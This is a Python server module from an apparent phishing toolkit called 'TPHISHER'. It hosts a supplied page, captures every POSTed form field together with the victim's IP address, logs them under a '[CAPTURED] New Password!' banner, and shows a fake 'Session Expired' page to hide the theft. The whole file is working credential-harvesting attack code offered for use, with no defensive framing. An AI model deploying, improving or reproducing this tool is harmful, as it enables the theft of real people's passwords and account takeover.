import socket
import urllib.parse
from http.server import HTTPServer, BaseHTTPRequestHandler
from core.config import Config
from core.capture import Capture

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
X = "\033[0m"


class Handler(BaseHTTPRequestHandler):
    html = ""

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(self.html.encode("utf-8"))

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length).decode("utf-8", errors="ignore")
        params = urllib.parse.parse_qs(raw)
        clean = {k: v[0] for k, v in params.items()}
        ip = self.client_address[0]
        Capture.save(ip, clean)

        print("")
        print(f"{R}  ========================================  {X}")
        print(f"{R}  |  {W}[CAPTURED]{X}{R} New Password!              |  {X}")
        print(f"{R}  ========================================  {X}")
        print(f"{R}  |{X}  {C}IP:{X}       {ip}")
        for k, v in clean.items():
            print(f"{R}  |{X}  {Y}{k}:{X}  {W}{v}{X}")
        print(f"{R}  ========================================  {X}")
        print("")

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()

        error_page = (
            "<!DOCTYPE html><html><head>"
            "<meta charset='UTF-8'>"
            "<meta name='viewport' content='width=device-width,initial-scale=1'>"
            "<style>"
            "*{margin:0;padding:0;box-sizing:border-box}"
            "body{font-family:-apple-system,sans-serif;display:flex;"
            "justify-content:center;align-items:center;min-height:100vh;"
            "background:linear-gradient(135deg,#667eea,#764ba2)}"
            ".b{text-align:center;background:#fff;padding:48px 32px;"
            "border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.2);"
            "max-width:360px}"
            ".b h2{color:#333;font-size:22px;margin-bottom:8px}"
            ".b p{color:#888;font-size:14px;line-height:1.5}"
            ".b .icon{font-size:48px;margin-bottom:16px}"
            "</style></head><body><div class='b'>"
            "<div class='icon'>&#128274;</div>"
            "<h2>Session Expired</h2>"
            "<p>Your session has timed out.<br>"
            "Please close and reopen the app.</p>"
            "</div></body></html>"
        )
        self.wfile.write(error_page.encode("utf-8"))

    def log_message(self, *args):
        pass


class Server:
    @staticmethod
    def run(html, port=None):
        if not port:
            port = Config.PORT

        Handler.html = html

        try:
            srv = HTTPServer(("0.0.0.0", port), Handler)
        except OSError:
            port = port + 1
            srv = HTTPServer(("0.0.0.0", port), Handler)

        try:
            ip = socket.gethostbyname(socket.gethostname())
        except Exception:
            ip = "127.0.0.1"

        print("")
        print(f"{G}  ==========================================  {X}")
        print(f"{G}  |         TPHISHER SERVER LIVE             |  {X}")
        print(f"{G}  ==========================================  {X}")
        print(f"{G}  |{X}  {W}Local  :{G} http://localhost:{port}              {X}")
        print(f"{G}  |{X}  {W}Network:{G} http://{ip}:{port}              {X}")
        print(f"{G}  |{X}  {Y}Logs   :{G} logs/captured.json             {X}")
        print(f"{G}  |{X}  {R}Press Ctrl+C to stop{G}                    {X}")
        print(f"{G}  ==========================================  {X}")
        print("")

        try:
            srv.serve_forever()
        except KeyboardInterrupt:
            print(f"\n{Y}  [*] Server stopped.{X}")
            srv.server_close()
